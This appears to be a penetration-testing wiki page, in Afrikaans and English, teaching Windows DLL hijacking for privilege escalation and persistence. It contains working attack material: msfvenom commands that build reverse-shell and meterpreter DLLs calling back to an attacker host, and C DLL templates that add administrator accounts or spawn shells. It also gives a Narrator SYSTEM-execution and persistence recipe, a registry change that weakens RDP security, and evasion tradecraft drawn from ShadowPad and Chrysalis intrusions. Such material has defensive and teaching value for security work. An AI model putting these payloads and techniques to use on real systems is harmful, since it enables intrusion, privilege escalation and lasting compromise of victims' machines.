# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

Dll Hijacking behels die manipulasie van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistence te bereik, en minder algemeen vir privilege escalation. Alhoewel die fokus hier op escalation is, bly die metode van hijacking dieselfde oor verskillende doelwitte heen.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, en die effektiwiteit hang af van hoe die toepassing DLLs laai:

1. **DLL Replacement**: Vervanging van 'n egte DLL met 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad wat voor die regmatige een kom, om die toepassing se soekpatroon uit te buiten.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL wat 'n toepassing sal laai omdat dit dink die DLL is 'n vereiste wat nie bestaan nie.
4. **DLL Redirection**: Wysig soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die regmatige DLL met 'n kwaadwillige teenhanger in die WinSxS directory — 'n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n deur die gebruiker beheerde gids langs die gekopieerde toepassing; dit lyk soos Binary Proxy Execution tegnieke.

> [!TIP]
> Vir 'n stap-vir-stap ketting wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading lae, hersien die werkvloei hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Om ontbrekende Dlls te vind

Die mees algemene manier om ontbrekende Dlls in 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die volgende 2 filters te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en wys net die **File System Activity**:

![](<../../../images/image (153).png>)

As jy op soek is na **missing dlls in general** laat jy dit vir 'n paar **seconds** loop.\
As jy na 'n **missing dll inside an specific executable** soek, stel 'n ander filter soos **"Process Name" "contains" `<exec name>`**, voer dit uit, en stop dan die capture van events.

## Exploiting Missing Dlls

Om privilege escalation te bereik, is die beste kans dat ons 'n dll kan skryf wat 'n proses met verhoogde regte sal probeer laai in 'n plek waar dit gesoek gaan word. Daarom kan ons 'n **dll skryf** in 'n **gids** waar die **dll gesoek word voor** die gids waar die **oorspronklike dll** is (vreemde geval), of ons kan skryf in 'n gids waar die dll gesoek gaan word en die oorspronklike **dll nie in enige gids bestaan nie**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-toepassings soek vir DLLs volgens 'n stel voorafbepaalde soekpade en volg 'n spesifieke volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n kwaadwillige DLL strategies in een van hierdie gidse geplaas word sodat dit gelaai word voor die egte DLL. 'n Oplossing om dit te voorkom is om seker te maak dat die toepassing absolute paths gebruik wanneer dit na vereiste DLLs verwys.

Jy kan die **DLL search order on 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **default** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die huidige gids op na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is dit geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** genoem word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens, let daarop dat **'n dll aangewys kan word met 'n absolute path in plaas van net die naam**. In daardie geval gaan daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos gewoonlik deur naam gelaai).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit hier nie verder verklaar nie.

### Om sideloading af te dwing via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gevorderde manier om deterministies die DLL-soekpad van 'n nuut geskepte proses te beïnvloed is om die DllPath veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses geskep word met ntdll se native APIs. Deur hier 'n deur die aanvaller beheerde gids te verskaf, kan 'n teikenproses wat 'n geïmporteerde DLL per naam oplos (geen absolute path en nie die safe loading flags gebruik nie) gedwing word om 'n kwaadwillige DLL uit daardie gids te laai.

Belangrike idee
- Bou die process parameters met RtlCreateProcessParametersEx en verskaf 'n pasgemaakte DllPath wat na jou beheerde gids wys (bv. die gids waar jou dropper/unpacker leef).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL per naam oplos, sal die loader hierdie verskafde DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE geplaas is nie.

Notas/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit is anders as SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL import of LoadLibrary per naam (geen absolute path nie en nie die gebruik van LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardgecodeerde absolute paths kan nie gehijack word nie. Forwarded exports en SxS kan ook prioriteit verander.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Volledige C voorbeeld: om DLL sideloading af te dwing via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Plaas 'n kwaadwillige xmllite.dll (exporting the required functions or proxying to the real one) in jou DllPath-gids.
- Start 'n gesigneerde binary wat bekend is om xmllite.dll by naam op te soek deur die bogenoemde tegniek. Die loader resolves die import via die verskafte DllPath en sideloads jou DLL.

Hierdie tegniek is in-the-wild waargeneem om multi-stage sideloading chains aan te dryf: 'n aanvanklike launcher drops 'n helper DLL, wat dan 'n Microsoft-signed, hijackable binary spawn met 'n custom DllPath om die laai van die aanvaller se DLL vanaf 'n staging directory af te dwing.


#### Uitsonderings op dll-soekorde in Windows docs

Sekere uitsonderings op die standaard DLL-soekorde word in Windows-dokumentasie aangeteken:

- Wanneer 'n **DLL wat sy naam deel met een wat reeds in geheue gelaai is** teengekom word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir redirection en 'n manifest uit voordat dit terugval op die DLL wat reeds in geheue is. **In hierdie scenario voer die stelsel nie 'n soektog vir die DLL uit nie**.
- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows-weergawe herken word, sal die stelsel sy weergawe van die known DLL gebruik, tesame met enige van sy afhanklike DLLs, **met uitskakeling van die soektog**. Die registersleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie known DLLs.
- Indien 'n **DLL have dependencies**, word die soektog vir hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volle pad geïdentifiseer is.

### Eskalering van voorregte

**Vereistes**:

- Identifiseer 'n proses wat tans werk of sal werk onder **different privileges** (horizontal or lateral movement), en wat **lacking a DLL** is.
- Verseker dat daar **write access** beskikbaar is vir enige **directory** waarin die **DLL** gaan wees **searched for**. Hierdie ligging kan die gids van die uitvoerbare wees of 'n gids binne die system path.

Ja, die vereistes is moeilik om te vind aangesien dit **by default it's kind of weird to find a privileged executable missing a dll** en dit is selfs **more weird to have write permissions on a system path folder** (jy kan dit nie standaard doen nie). Maar in wanopgestelde omgewings is dit moontlik.\
Indien jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek raadpleeg. Selfs al is die **main goal of the project is bypass UAC**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die vouer te verander waar jy write permissions het).

Let wel dat jy kan **check your permissions in a folder** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die permissions van alle gidse binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** wanneer jy skryfregte in 'n **System Path folder** het, kyk:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outomatiese gereedskap

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal kontroleer of jy skryfregte het op enige vouer binne die system PATH.\
Ander interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll_.

### Voorbeeld

As jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut om **'n dll te skep wat ten minste al die funksies eksporteer wat die uitvoerbare program daaruit sal invoer**. Let wel: Dll Hijacking is handig om te gebruik om [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll hijacking studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Boonop kan jy in die **volgende afdeling** 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll te skep wat nie-vereiste funksies eksporteer**.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om te **blootstel** en **te werk** soos **verwag** deur **al die oproepe aan die werklike biblioteek deur te stuur**.

Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik 'n uitvoerbare program aandui en die biblioteek kies wat jy wil proxify en 'n proxified dll genereer of die Dll aandui en 'n proxified dll genereer.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let daarop dat in verskeie gevalle die Dll wat jy kompileer moet **export several functions** wat deur die victim process gelaai sal word; as hierdie functions nie bestaan nie, sal die **binary won't be able to load** hulle en die **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met aanmaak van 'n gebruiker</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevalstudie: Narrator OneCore TTS Localization DLL Hijack (Toeganklikheid/ATs)

Windows Narrator.exe ondersoek steeds 'n voorspelbare, taalspesifieke lokalisering DLL by opstart wat gekaap kan word vir arbitrêre kode-uitvoering en persistentie.

Sleutelfeite
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Erfenispad (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As daar 'n skryfbare, deur 'n aanvaller beheerde DLL by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` uitgevoer. Geen exports is nodig nie.

Opsporing met Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator en kyk na die poging om bogenoemde pad te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger en persistentheid via Accessibility-konfigurasie
- Gebruikerskonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde, laai die begin van Narrator die geplante DLL. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.

RDP-geaktiveerde SYSTEM-uitvoering (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die host, op die logon screen druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit—inject/migrate vinnig.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notas
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Kwessies van die Kwetsbaarheid

- **Komponent**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geskeduleerde Taak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Gidspermissies**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL-soekgedrag**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Uitvoering van Exploit

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsverloop

1. As 'n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 9:30 AM loop in die huidige gebruiker se konteks.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, loop die kwaadwillige DLL in die administrateur se sessie by medium integrity.
4. Koppel standaard UAC bypass-tegnieke aaneen om van medium integrity na SYSTEM privileges op te gradeer.

## Gevallestudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Dreigeraars kombineer dikwels MSI-gebaseerde droppers met DLL side-loading om payloads uit te voer onder 'n vertroude, ondertekende proses.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI-analise (waarvoor om te kyk)
- CustomAction table:
- Kyk vir inskrywings wat uitvoerbare lêers of VBScript loop. Voorbeeld van 'n verdagte patroon: LaunchApplication wat 'n ingebedde lêer in die agtergrond uitvoer.
- In Orca (Microsoft Orca.exe), ondersoek die CustomAction, InstallExecuteSequence en Binary tables.
- Ingebedde/gesplitste payloads in die MSI CAB:
- Administratiewe uittreksel: msiexec /a package.msi /qb TARGETDIR=C:\out
- Of gebruik lessmsi: lessmsi x package.msi C:\out
- Kyk vir meerdere klein fragmente wat saamgeheg en deur 'n VBScript CustomAction gedekodeer word. Algemene vloei:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: 'n legitieme gesigneerde host (Avast). Die proses probeer wsc.dll per naam uit sy gids laai.
- wsc.dll: attacker DLL. Indien geen spesifieke exports vereis word nie, kan DllMain volstaan; anders bou 'n proxy DLL en stuur die vereiste exports na die egte biblioteek terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir export requirements, gebruik 'n proxying framework (e.g., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL naamresolusie deur die host binary. As die host absolute paths of safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) gebruik, kan die hijack misluk.
- KnownDLLs, SxS, and forwarded exports kan die precedensie beïnvloed en moet oorweeg word tydens die keuse van die host binary en export set.

## Ondertekende triades + geënkripteerde payloads (ShadowPad gevalstudie)

Check Point beskryf hoe Ink Dragon ShadowPad inspan deur 'n **drie-lêer triade** te gebruik om in te meng met wettige sagteware terwyl die kern-payload op skyf geënkripteer bly:

1. **Ondertekende host EXE** – vendors soos AMD, Realtek, of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die executable om soos 'n Windows binary te lyk (byvoorbeeld `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Kwaadaardige loader DLL** – geplaas langs die EXE met 'n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik 'n MFC binary wat met die ScatterBrain framework geobfuskeer is; dit se enigste taak is om die geënkripteerde blob te vind, dit te dekodeer, en ShadowPad reflectief te map.
3. **Geënkripteerde payload blob** – dikwels gestoor as `<name>.tmp` in dieselfde gids. Nadat die gede-kripteerde payload memory-mapped is, verwyder die loader die TMP-lêer om forensiese bewyse te vernietig.

Tradecraft notes:

* Deur die ondertekende EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word) kan dit as 'n Windows binary voortspeel terwyl die vendor-handtekening behou bly — repliseer Ink Dragon se gewoonte om `conhost.exe`-agtige binaries te drop wat eintlik AMD/NVIDIA utilities is.
* Omdat die executable vertrou bly, benodig die meeste allowlisting controls slegs dat jou kwaadaardige DLL langs dit sit. Fokus op die aanpassing van die loader DLL; die ondertekende ouer kan tipies onaangeraak hardloop.
* ShadowPad’s decryptor verwag die TMP blob langs die loader en dat dit writabe is sodat dit die lêer kan zero nadat dit gemap is. Hou die gids writabe tot die payload laai; sodra dit in geheue is, kan die TMP-lêer veilig verwyder word vir OPSEC.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

'n Onlangse Lotus Blossom intrusion misbruik 'n vertroude update-ketting om 'n NSIS-gepakke dropper te lewer wat 'n DLL sideload en volledig in-geheue payloads staged.

Tradecraft flow
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit **HIDDEN**, drop 'n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, 'n kwaadaardige `log.dll`, en 'n geënkripteerde blob `BluetoothService`, en begin dan die EXE.
- Die host EXE importeer `log.dll` en roep `LogInit`/`LogWrite`. `LogInit` mmap-loads die blob; `LogWrite` dekodeer dit met 'n custom LCG-based stream (konstantes **0x19660D** / **0x3C6EF35F**, sleutelmateriaal afgelei van 'n vorige hash), oorskryf die buffer met plaintext shellcode, vrymaak temps, en spring daarnaheen.
- Om 'n IAT te vermy, los die loader APIs op deur export names te hasj met **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, daarna 'n Murmur-styl avalanche toe te pas (**0x85EBCA6B**) en te vergelyk teen gesoute teiken-hashes.

Main shellcode (Chrysalis)
- Ontsleutel 'n PE-agtige main module deur add/XOR/sub te herhaal met sleutel `gQ2JR&9;` oor vyf passe, en laai dan dinamies `Kernel32.dll` → `GetProcAddress` om import-resolusie te voltooi.
- Herbou DLL-naamstrings tydens runtime via per-karakter bit-rotate/XOR transformasies, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik 'n tweede resolver wat die **PEB → InMemoryOrderModuleList** deurloop, elke export table in 4-byte blokke parsen met Murmur-styl mixing, en slegs terugval op `GetProcAddress` as die hash nie gevind word nie.

Embedded configuration & C2
- Konfig lê binne die gedropte `BluetoothService` lêer by **offset 0x30808** (size **0x980**) en is RC4-gedekodeer met sleutel `qwhvb^435h&*7`, wat die C2 URL en User-Agent openbaar.
- Beacons bou 'n dot-delimited host profile, voeg tag `4Q` voor, en RC4-enkripteer dan met sleutel `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Response word RC4-gedekodeer en verdeel deur 'n tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Uitvoeringsmodus word bepaal deur CLI args: geen args = installeer persistence (service/Run key) wat na `-i` wys; `-i` herbegin self met `-k`; `-k` slaan installasie oor en hardloop die payload.

Alternate loader observed
- Dieselfde intrusie drop Tiny C Compiler en voer `svchost.exe -nostdlib -run conf.c` uit vanaf `C:\ProgramData\USOShared\`, met `libtcc.dll` langsaan. Die aanvaller-verskafde C-bron het shellcode ingebed, dit saamgestel, en in-geheue uitgevoer sonder die skyf met 'n PE te raak. Repliceer met:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
Hierdie op TCC gebaseerde compile-and-run-fase het `Wininet.dll` tydens runtime geïmporteer en 'n second-stage shellcode van 'n hardgekodeerde URL opgehaal, wat 'n buigsame loader skep wat as 'n compiler run vermom is.

## Verwysings

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
